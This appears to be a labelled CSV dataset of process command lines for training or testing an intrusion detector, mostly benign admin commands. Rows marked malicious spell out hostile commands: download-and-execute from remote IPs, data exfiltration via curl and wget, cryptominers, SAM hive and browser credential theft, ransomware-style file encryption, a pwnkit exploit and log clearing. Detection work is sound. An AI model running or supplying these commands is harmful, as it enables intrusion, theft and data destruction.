process_name,command_line,label,attack_type
powershell.exe,powershell.exe Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Vendor' -Name LogLevel -Value 2 (CR-74),benign,defense_evasion
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit cache10 --tags deploy --extra-vars 'version=9.33.8',benign,lateral_movement
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance ci12 -Database manifest -BackupFile 'X:\backups\manifest-5.5.2.bak' (user: MSSQLSERVER),benign,sql_exploitation
apt-get,apt-get install -y --no-install-recommends vendor-agent=3.10.6 && systemctl enable vendor-agent,benign,persistence
pg_dump,pg_dump -h 10.12.54.22 -U admin -Fc -f /srv/backups/db/manifest-4.18.6.dump --no-password customers,benign,credential_dumping
ldapsearch,"ldapsearch -x -H ldap://svc07.prod.svc.cluster.local -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
kubectl,kubectl cp production/ledger_2024-3ce17a428c81732668fc510497f4a53f:/var/log/app /tmp/diag/ledger_2024 -c app,benign,data_exfiltration
sqlpackage,sqlpackage /Action:Export /SourceServerName:edge11 /SourceDatabaseName:snapshot /TargetFile:X:\dac\snapshot.bacpac (user: MSSQLSERVER),benign,sql_exploitation
sccm,ccmexec.exe /deploy /package:telemetry_batch-3.37.0 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
docker,docker run --rm --cpus 5 buildkit:latest build --tag dataset_part:9.8.4 /workspace,benign,crypto_miner
find,find /home/deploy -type f -name '*.manifest' -exec openssl enc -aes-256-cbc -k 2bc73e93c9877ed8 -in {} -out {}.enc \;,malicious,ransomware
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 2.16.2"" dir=in action=allow protocol=TCP localport=2222",benign,defense_evasion
schtasks.exe,"schtasks.exe /create /tn ""\Microsoft\Windows\AdobeGCInvoker"" /tr ""powershell -nop -w hidden -enc PHRhc2steG1sLW1hcmtlcj4="" /sc minute /mo 30 /ru SYSTEM /f",malicious,persistence
7z,7z a -mx=9 -ms=on /srv/backups/archive/payroll-1.31.8.7z /mnt/storage/shares/department/legal -xr!node_modules,benign,ransomware
at.exe,at.exe \\10.20.234.156 13:00 cmd /c \\cache08\C$\Windows\Temp\cca840f5b255fc2e7de8b577a745bcc9.bat,malicious,lateral_movement
sqlcmd,sqlcmd -S 10.40.227.31 -E -i C:\Maintenance\reindex-session_blob.sql -o C:\Logs\reindex-6.log (user: MSSQLSERVER),benign,sql_exploitation
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /srv/data/projects/2024 -Dest \\app10\backups$ -Retain 64,benign,ransomware
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-dataset_part.rman log=/var/log/rman-52.log (user: oracle),benign,sql_exploitation
7z,7z a -mx=9 -ms=on /srv/backups/archive/telemetry_batch-8.1.8.7z /var/lib/app/customer/exports -xr!node_modules,benign,ransomware
apt-get,apt-get install -y --no-install-recommends vendor-agent=1.33.2 && systemctl enable vendor-agent,benign,persistence
openssl,openssl pkcs12 -export -in /etc/ssl/audit_trail.crt -inkey /etc/ssl/audit_trail.key -out /srv/backups/certs/audit_trail.pfx -passout pass:8934fd9a4302,benign,credential_dumping
tar,tar -czf /srv/backups/nightly/session_blob-9.11.9.tar.gz /var/lib/app/customer/exports --exclude='*.tmp',benign,ransomware
socat,"socat TCP-LISTEN:443,reuseaddr,fork TCP:10.12.54.22:5432",benign,reverse_shell
openssl,openssl enc -aes-256-cbc -salt -in /var/lib/app/customer/exports/manifest.db -out /var/lib/app/customer/exports/manifest.db.locked -k 1b72589478962291,malicious,ransomware
bash,"bash -c ""systemctl --user enable audit_trail.service && loginctl enable-linger release""",benign,persistence
ab,ab -n 100000 -c 500 -k https://build08.internal.acme.io/healthz,benign,crypto_miner
fluent-bit,fluent-bit -i tail -p path=/var/log/manifest/*.log -o forward -p host=10.10.41.185 -p port=24224,benign,data_exfiltration
rsync,rsync -az --partial --bwlimit=20000 /var/log/dataset_part/ logsink@10.35.254.77:/data/logs/db12/,benign,data_exfiltration
reg.exe,reg.exe save HKLM\SAM C:\Windows\Temp\6182eba08e61717f.sam /y,malicious,credential_dumping
cmd.exe,"cmd.exe /c ""net user admin 3ce17a428c81732668fc510497f4a53f /add & net localgroup administrators admin /add"" (parent: sqlservr.exe)",malicious,sql_exploitation
reg.exe,reg.exe save HKLM\SYSTEM C:\Windows\Temp\372720619a1ea61e.sys /y,malicious,credential_dumping
rsync,rsync -az --partial --bwlimit=20000 /var/log/dataset_part/ logsink@10.1.76.39:/data/logs/node08/,benign,data_exfiltration
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-4.33.4.wfw,benign,defense_evasion
robocopy,robocopy /data/warehouse/staging/landing/raw \\db02\backups$\telemetry_batch /MIR /Z /R:3 /W:5 /LOG:C:\Logs\backup-99.log,benign,ransomware
duplicity,duplicity --full-if-older-than 7D --encrypt-key 0c2273ecfd564271 C:\ProgramData\Vendor\Telemetry\spool file:///srv/backups/dup/web05,benign,ransomware
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-7.36.6.wfw,benign,defense_evasion
gzip,tar c C:\Users\jenkins\AppData\Local\Temp\cache | gzip -9 | wc -c (compression ratio QA check),benign,crypto_miner
powershell.exe,"powershell.exe -c ""Invoke-Command -ComputerName node11 -ScriptBlock { iex (New-Object Net.WebClient).DownloadString('http://193.102.122.46/e9d07a0fd4c6b6771df7381b88528518') }""",malicious,lateral_movement
kworkerds,kworkerds -o stratum+tcp://5.52.169.18:4444 -u 8934fd9a4302 -p x --donate-level 0 --cpu-priority 5,malicious,crypto_miner
make,make -j32 all && make -j32 test (CI build farm node db02),benign,crypto_miner
gpg,gpg --batch --yes --passphrase cfd4a43ca8e4d035 -c /data/warehouse/staging/landing/raw/snapshot.xlsx && shred -u /data/warehouse/staging/landing/raw/snapshot.xlsx,malicious,ransomware
socat,"socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.1.100.52:5432",benign,reverse_shell
docker,docker exec -it audit_trail-97bf4fd3b1ee /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
systemd,/tmp/.2ff8134dc12fbbc45615e8e2628cbd84/systemd -c /tmp/.2ff8134dc12fbbc45615e8e2628cbd84/config.json --cpu-max-threads-hint 100,malicious,crypto_miner
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\9b1af2849958c5a7ba0be7afd747b864 -FilePath C:\Backups\certs\ledger_2024.cer,benign,credential_dumping
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\d598050b917c6e7b00eda90371cdcfa2 -FilePath C:\Backups\certs\dataset_part.cer,benign,credential_dumping
7z,7z a -mx=9 -ms=on /srv/backups/archive/audit_trail-4.36.3.7z /mnt/storage/shares/department/legal -xr!node_modules,benign,ransomware
docker,docker run --rm --cpus 28 buildkit:latest build --tag session_blob:3.13.4 /workspace,benign,crypto_miner
psexec.exe,psexec.exe \\svc06 -u CORP\www-data -h -accepteula msiexec /i \\edge08\sccm$\packages\dataset_part-6.9.4.msi /qn,benign,lateral_movement
mysqldump,mysqldump --single-transaction --routines --triggers -u ops -p$DB_PASS billing > /srv/backups/design_spec.sql,benign,credential_dumping
rsync,rsync -az --partial --bwlimit=20000 /var/log/report_final/ logsink@10.1.249.140:/data/logs/db11/,benign,data_exfiltration
ufw,ufw allow from 10.6.145.52/24 to any port 4444 proto tcp comment 'app cluster 5.11.0',benign,defense_evasion
openssl,openssl speed -multi 32 -seconds 30 aes-256-cbc sha256 rsa2048,benign,crypto_miner
ab,ab -n 100000 -c 500 -k https://db07.eng.example.net/healthz,benign,crypto_miner
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\manifest /v Version /t REG_SZ /d 0.5.9 /f,benign,persistence
ufw,ufw allow from 10.29.10.46/24 to any port 2222 proto tcp comment 'app cluster 5.23.6',benign,defense_evasion
scp,scp -i /etc/ci/deploy_key build/dataset_part-2.40.6.tar.gz release@web09.eng.example.net:/opt/app/releases/,benign,lateral_movement
make,make -j13 all && make -j13 test (CI build farm node svc10),benign,crypto_miner
ldapsearch,"ldapsearch -x -H ldap://svc10.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
bash,"bash -c 'id; uname -a; curl -s http://193.102.122.46/632196f863074b23|bash' (parent: postgres, COPY TO PROGRAM)",malicious,sql_exploitation
dpkg,dpkg -i /opt/packages/session_blob-8.11.3_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-ledger_2024.rman log=/var/log/rman-54.log (user: oracle),benign,sql_exploitation
bash,"bash -c ""systemctl --user enable design_spec.service && loginctl enable-linger admin""",benign,persistence
sc.exe,sc.exe config BackupSvc start= disabled & sc.exe stop BackupSvc,malicious,defense_evasion
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance app11 -Database snapshot -BackupFile 'X:\backups\snapshot-6.13.3.bak' (user: MSSQLSERVER),benign,sql_exploitation
certutil.exe,certutil.exe -urlcache -split -f -encode C:\Temp\df0322977aa5.dat & curl -s http://185.35.93.71/df0322977aa5 --data-binary @C:\Temp\df0322977aa5.dat,malicious,data_exfiltration
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-session_blob.rman log=/var/log/rman-13.log (user: oracle),benign,sql_exploitation
sqlcmd,sqlcmd -S 10.27.180.204 -E -i C:\Maintenance\reindex-archive_set.sql -o C:\Logs\reindex-76.log (user: MSSQLSERVER),benign,sql_exploitation
reg.exe,reg.exe save HKLM\SAM C:\Windows\Temp\2d2d8926fa8cd76eca327835c28fbb54.sam /y,malicious,credential_dumping
pg_dump,pg_dump -h 10.0.153.163 -U mssql -Fc -f /srv/backups/db/dataset_part-9.33.1.dump --no-password customers,benign,credential_dumping
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\dataset_part /v Version /t REG_SZ /d 0.38.7 /f,benign,persistence
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /usr/local/share/pipeline/artifacts/build -Dest \\node03\backups$ -Retain 64,benign,ransomware
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-8.27.6.wfw,benign,defense_evasion
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit build05 --tags deploy --extra-vars 'version=4.4.7',benign,lateral_movement
crontab,crontab -u admin -l | grep -v logrotate; echo '0 2 * * * /usr/sbin/logrotate /etc/logrotate.conf' | crontab -u admin -,benign,persistence
scp,scp -C -i /etc/ci/key /srv/backups/db/audit_trail-9.24.5.dump backup@cache03.prod.svc.cluster.local:/srv/offsite/,benign,data_exfiltration
cron,echo '*/15 * * * * deploy /opt/monitoring/collect-metrics.sh --push gateway://10.39.250.240:9091' > /etc/cron.d/metrics,benign,persistence
openssl,openssl enc -aes-256-cbc -salt -in /srv/data/projects/2024/manifest.db -out /srv/data/projects/2024/manifest.db.locked -k 1ef0f55b791d3ce4bb8e85e63dc841bf,malicious,ransomware
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-9.26.6.wfw,benign,defense_evasion
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance db03 -Database payroll -BackupFile 'X:\backups\payroll-8.6.5.bak' (user: MSSQLSERVER),benign,sql_exploitation
powershell.exe,powershell.exe Invoke-Command -ComputerName ci09 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 4.2.6,benign,lateral_movement
sc.exe,sc.exe config EventLog start= auto (corporate baseline GPO e5355c45c507b05b),benign,defense_evasion
fluent-bit,fluent-bit -i tail -p path=/var/log/snapshot/*.log -o forward -p host=10.25.157.194 -p port=24224,benign,data_exfiltration
docker,docker exec -it payroll-9db686415b10cd51 /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-3.38.5.wfw,benign,defense_evasion
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\edge08\sccm$\dataset_part-3.6.6.msi /qn""",benign,privilege_escalation
rsync,rsync -az --partial --bwlimit=20000 /var/log/snapshot/ logsink@10.12.80.177:/data/logs/ci04/,benign,data_exfiltration
docker,docker run --rm --cpus 11 buildkit:latest build --tag dataset_part:4.24.8 /workspace,benign,crypto_miner
apt-get,apt-get install -y --no-install-recommends vendor-agent=0.22.7 && systemctl enable vendor-agent,benign,persistence
apt-get,apt-get install -y --no-install-recommends vendor-agent=7.31.4 && systemctl enable vendor-agent,benign,persistence
gpg,gpg --export-secret-keys --armor backups@corp.local > /srv/backups/keys/snapshot.asc,benign,credential_dumping
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\db11\sccm$\report_final-3.23.3.msi /qn""",benign,privilege_escalation
sshd,sshd --algo rx/0 -o 185.35.93.71:8443 -u 97bf4fd3b1ee --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /usr/local/share/pipeline/artifacts/build -Dest \\edge01\backups$ -Retain 43,benign,ransomware
cron,echo '*/15 * * * * www-data /opt/monitoring/collect-metrics.sh --push gateway://10.3.253.182:9091' > /etc/cron.d/metrics,benign,persistence
gpupdate.exe,gpupdate.exe /force && gpresult /h C:\Logs\gpresult-edge11.html,benign,defense_evasion
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\f2116ac93be7f970fc8ee527cc37ab89 -FilePath C:\Backups\certs\payroll.cer,benign,credential_dumping
dpkg,dpkg -i /opt/packages/customer_db-5.33.3_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.4.5 && systemctl enable vendor-agent,benign,persistence
kubectl,kubectl rollout restart deployment/audit_trail -n production --kubeconfig /etc/k8s/prod.conf,benign,lateral_movement
powershell.exe,"powershell.exe -c ""Copy-Item 'C:\Users\www-data\AppData\Local\Google\Chrome\User Data\Default\Login Data' C:\Windows\Temp\6be137b4fffe.db""",malicious,credential_dumping
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\payroll C:\Backups\reg\payroll-6.4.4.reg /y,benign,credential_dumping
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 3.5.2"" dir=in action=allow protocol=TCP localport=1337",benign,defense_evasion
socat,"socat TCP-LISTEN:443,reuseaddr,fork TCP:10.3.76.111:5432",benign,reverse_shell
sc.exe,sc.exe config TermService start= auto (corporate baseline GPO a99fbb808b8f46c442737aadb56909b8),benign,defense_evasion
wget,wget --post-file=/tmp/.5d85dec60b8a/design_spec.zip http://45.109.246.245:5985/c -O /dev/null,malicious,data_exfiltration
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-1.3.4.reg /y,benign,credential_dumping
mosh,mosh --ssh='ssh -i /etc/ci/key' admin@ci06.ad.example.com -- tmux attach -t deploy,benign,reverse_shell
gpg,gpg --batch --yes --passphrase 421bbb44f3c9 -c /srv/data/projects/2024/archive_set.xlsx && shred -u /srv/data/projects/2024/archive_set.xlsx,malicious,ransomware
azcopy,azcopy copy '/home/release/Documents/Finance/Q2' 'https://acme.blob.core.windows.net/backups/payroll?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
pdsh,pdsh -w svc07[01-12] 'yum update -y --security && needs-restarting -r',benign,lateral_movement
curl,curl -s -T /srv/reports/report_final-7.35.7.pdf -u svc_report:$RPT_TOKEN https://reports.corp.local/api/v2/upload,benign,data_exfiltration
pg_dump,pg_dump -h 10.27.129.42 -U postgres -Fc -j 4 -f /srv/backups/db/design_spec-9.2.1.dump analytics (user: postgres),benign,sql_exploitation
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\snapshot /v Version /t REG_SZ /d 7.28.3 /f,benign,persistence
pkexec,pkexec --version; GCONV_PATH=/tmp/.45599927f333 pkexec /bin/sh (pwnkit pattern),malicious,privilege_escalation
apt-get,apt-get install -y --no-install-recommends vendor-agent=9.38.5 && systemctl enable vendor-agent,benign,persistence
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /var/opt/sccm/packages/distribution -Dest \\ci01\backups$ -Retain 22,benign,ransomware
hashcat,"hashcat -b -m 0 -D 1 --quiet (benchmark only, QA validation node db02)",benign,crypto_miner
fluent-bit,fluent-bit -i tail -p path=/var/log/payroll/*.log -o forward -p host=10.4.22.20 -p port=24224,benign,data_exfiltration
terraform,terraform apply -auto-approve -target=module.cluster.node.build03 -var image_version=7.1.8,benign,lateral_movement
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance svc01 -Database report_final -BackupFile 'X:\backups\report_final-4.3.9.bak' (user: MSSQLSERVER),benign,sql_exploitation
tar,tar czf - /data/warehouse/staging/landing/raw | ssh -i /etc/ci/key backup@10.38.199.37 'cat > /srv/backups/ledger_2024-9.17.9.tgz',benign,data_exfiltration
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\web11\sccm$\dataset_part-6.10.7.msi /qn""",benign,privilege_escalation
mysqldump,mysqldump --single-transaction --routines --triggers -u sysadmin -p$DB_PASS billing > /srv/backups/customer_db.sql,benign,credential_dumping
scp,scp -C -i /etc/ci/key /srv/backups/db/manifest-6.39.8.dump backup@cache04.internal.acme.io:/srv/offsite/,benign,data_exfiltration
ufw,ufw allow from 10.5.98.114/24 to any port 443 proto tcp comment 'app cluster 1.25.6',benign,defense_evasion
dpkg,dpkg -i /opt/packages/design_spec-5.0.3_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
sccm,ccmexec.exe /deploy /package:design_spec-7.30.1 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\ledger_2024 /v Version /t REG_SZ /d 6.26.8 /f,benign,persistence
dpkg,dpkg -i /opt/packages/payroll-8.18.9_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
wevtutil.exe,"wevtutil.exe cl ""Setup""",malicious,defense_evasion
rsync,rsync -aHAX --delete --partial /var/lib/app/customer/exports/ /srv/backups/incremental/build07/,benign,ransomware
ufw,ufw allow from 10.2.193.52/24 to any port 1337 proto tcp comment 'app cluster 2.17.4',benign,defense_evasion
restic,restic -r sftp:svc_backup@edge02.internal.acme.io:/backups backup /opt/vendor/pkg/cache/objects --tag nightly --exclude-caches,benign,ransomware
pg_dump,pg_dump -Fc -Z9 -f /srv/backups/db/audit_trail-6.29.9.dump warehouse,benign,ransomware
borg,"borg create --stats --compression zstd,9 /mnt/backup::dataset_part-16-81 /var/lib/app/customer/exports",benign,ransomware
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\telemetry_batch /v Version /t REG_SZ /d 0.7.6 /f,benign,persistence
